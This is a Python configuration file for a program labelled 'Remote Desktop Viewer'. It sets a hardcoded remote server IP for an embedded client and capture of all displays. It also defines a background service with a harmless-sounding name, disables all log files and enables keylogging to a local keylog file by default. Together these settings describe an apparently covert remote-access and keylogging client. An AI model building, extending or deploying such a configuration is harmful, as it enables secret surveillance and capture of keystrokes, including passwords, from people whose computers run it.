"""
Configuration settings for Remote Desktop Viewer
"""
import os
import sys
from pathlib import Path

# Network Configuration
DEFAULT_SERVER_HOST = "0.0.0.0"
DEFAULT_SERVER_PORT = 8443
DEFAULT_CLIENT_PORT = 8443

# Embedded Client Defaults (can be overridden by command-line, env, or config file)
EMBEDDED_SERVER_HOST = "139.60.161.142"  # Default server IP address
EMBEDDED_SERVER_PORT = 8443  # Default server port

# Screen Capture Settings
CAPTURE_FPS = 15  # Frames per second (reduced from 10 for better responsiveness, but still efficient)
SCREEN_QUALITY = 70  # JPEG quality (1-100) - reduced from 80 to save bandwidth
MAX_FRAME_SIZE = (1920, 1080)  # Maximum resolution
CAPTURE_ALL_DISPLAYS = True  # If True, capture all monitors; If False, capture single monitor

# Delta Update Settings
ENABLE_DELTA_UPDATES = False  # Disabled for stability - full frames are more reliable
DELTA_THRESHOLD = 0.1  # Minimum change percentage to send update

# Compression Settings
ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 3  # zlib compression level (0-9) - reduced from 6 for faster compression

# Service Configuration
SERVICE_NAME = "RemoteDesktopViewer"
SERVICE_DISPLAY_NAME = "Remote Desktop Viewer Client"
SERVICE_DESCRIPTION = "Background service for remote desktop viewing"

# Paths - Handle both script execution and PyInstaller executables
def get_base_dir():
    """Get the base directory, handling both script and executable execution"""
    if getattr(sys, 'frozen', False):
        # Running as PyInstaller bundle - use directory containing the executable
        base_dir = Path(sys.executable).parent
    else:
        # Running as script - use directory containing config.py
        base_dir = Path(__file__).parent
    return base_dir

BASE_DIR = get_base_dir()
CERTS_DIR = BASE_DIR / "certs"

# Certificate paths (for fallback only - embedded certs are preferred)
SERVER_CERT = CERTS_DIR / "server.crt"
SERVER_KEY = CERTS_DIR / "server.key"
CLIENT_CERT = CERTS_DIR / "client.crt"
CLIENT_KEY = CERTS_DIR / "client.key"
CA_CERT = CERTS_DIR / "ca.crt"

# Logging disabled - no log files created
CLIENT_LOG = None
SERVER_LOG = None

# Keylog Configuration
KEYLOG_ENABLED = True  # Enable/disable keylogging
KEYLOG_FILE = BASE_DIR / "keylogs" / "keylog.txt"  # Keylog file path
